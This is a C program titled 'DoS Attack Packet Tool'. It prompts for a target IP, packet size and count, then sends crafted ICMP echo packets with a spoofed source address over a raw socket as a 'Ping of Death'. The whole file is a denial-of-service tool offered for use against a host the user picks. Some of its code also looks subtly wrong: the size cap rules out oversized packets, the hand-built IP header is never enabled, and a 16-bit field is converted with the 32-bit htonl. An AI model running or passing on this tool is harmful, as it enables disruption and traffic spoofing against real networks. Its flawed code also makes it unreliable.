#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

// Function prototypes
void sendPingOfDeath(char *target, int packetSize, int count);
unsigned short checksum(void *b, int len);
void displayMenu();
void getPingOfDeathPacketData(char *target, int *packetSize, int *packetCount);

int main() {
    int choice;
    while (1) {
        displayMenu();
        printf("Select an option: ");
        scanf("%d", &choice);
        getchar();  // Clear newline from input buffer

        switch (choice) {
            case 1:
                {
                    char target[50];
                    int packetSize, packetCount;

                    getPingOfDeathPacketData(target, &packetSize, &packetCount);
                    sendPingOfDeath(target, packetSize, packetCount);
                }
                break;
            case 0:
                printf("Exiting the program.\n");
                return 0;
            default:
                printf("Invalid option! Try again.\n");
        }
    }

    return 0;
}

void displayMenu() {
    printf("=== DoS Attack Packet Tool ===\n");
    printf("1. Ping of Death\n");
    printf("0. Exit\n");
}

void getPingOfDeathPacketData(char *target, int *packetSize, int *packetCount) {
    printf("Enter the target IP address: ");
    fgets(target, 50, stdin);
    target[strcspn(target, "\n")] = '\0';  // Remove newline character

    printf("Enter the packet size (max 65535): ");
    scanf("%d", packetSize);
    getchar();

    printf("Enter the number of packets to send: ");
    scanf("%d", packetCount);
    getchar();
}

void sendPingOfDeath(char *target, int packetSize, int count) {
    if (packetSize > 65535) {
        printf("Packet size exceeds maximum allowed size (65535). Aborting.\n");
        return;
    }

    int sockfd;
    struct sockaddr_in target_addr;
    char *packet;
    struct icmphdr *icmp_header;
    struct iphdr *ip_header;

    packet = malloc(packetSize);
    if (packet == NULL) {
        perror("Memory allocation failed");
        return;
    }

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        free(packet);
        return;
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(target);

    // Crafting the packet
    ip_header = (struct iphdr *)packet;
    icmp_header = (struct icmphdr *)(packet + sizeof(struct iphdr));

    // IP header
    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = 0;
    ip_header->tot_len = htons(packetSize);
    ip_header->id = htonl(54321);
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_ICMP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr("192.168.1.100");  // Spoofed source IP (replace as needed)
    ip_header->daddr = target_addr.sin_addr.s_addr;

    // ICMP header
    icmp_header->type = ICMP_ECHO;
    icmp_header->code = 0;
    icmp_header->checksum = 0;
    icmp_header->un.echo.id = htons(1234);
    icmp_header->un.echo.sequence = htons(1);

    // Filling the packet with custom payload (example payload)
    memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), 'A', packetSize - sizeof(struct iphdr) - sizeof(struct icmphdr));

    // Checksum calculation
    ip_header->check = checksum((unsigned short *)packet, sizeof(struct iphdr));
    icmp_header->checksum = checksum((unsigned short *)icmp_header, packetSize - sizeof(struct iphdr));

    for (int i = 0; i < count; i++) {
        if (sendto(sockfd, packet, packetSize, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Packet sending failed");
        } else {
            printf("Packet %d sent to %s\n", i + 1, target);
        }
    }

    free(packet);
    close(sockfd);
}

// Checksum calculation
unsigned short checksum(void *b, int len) {    
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}
